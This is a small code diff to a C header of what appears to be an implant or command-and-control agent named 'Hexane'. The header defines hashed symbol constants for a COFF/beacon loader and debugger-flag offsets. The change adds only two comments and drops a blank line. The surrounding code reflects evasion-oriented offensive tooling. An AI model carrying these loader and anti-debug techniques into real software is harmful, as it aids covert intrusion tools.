@@ -73,6 +73,7 @@ EXTERN_C LPVOID InstEnd();
 	#define DBG_FLAG_OFFSET 					DBG_FLAG_OFFSET64
 	#define IMAGE_OPT_MAGIC 					IMAGE_NT_OPTIONAL_HDR64_MAGIC
 	#define MACHINE_ARCH    					IMAGE_FILE_MACHINE_AMD64
+// set these dynamically?
 	#define COFF_PREP_SYMBOL        			0xec6ba2a8 	// __imp_
 	#define COFF_PREP_SYMBOL_SIZE   			6
 	#define COFF_PREP_BEACON        			0xd0a409b0  // __imp_Hexane
@@ -86,6 +87,7 @@ EXTERN_C LPVOID InstEnd();
 	#define DBG_FLAG_OFFSET 					DBG_FLAG_OFFSET32
 	#define IMAGE_OPT_MAGIC 					IMAGE_NT_OPTIONAL_HDR32_MAGIC
 	#define MACHINE_ARCH    					IMAGE_FILE_MACHINE_I386
+// set these dynamically?
     #define COFF_PREP_SYMBOL        			0x79dff807	// __imp__
     #define COFF_PREP_SYMBOL_SIZE   			7
     #define COFF_PREP_BEACON        			0x4c20aa4f	// __imp__Hexane
@@ -601,6 +603,5 @@ struct _hexane{
 		_prototype(InitializeAcl);
 		_prototype(FreeSid);
 	} win32;
-
 };
 #endif
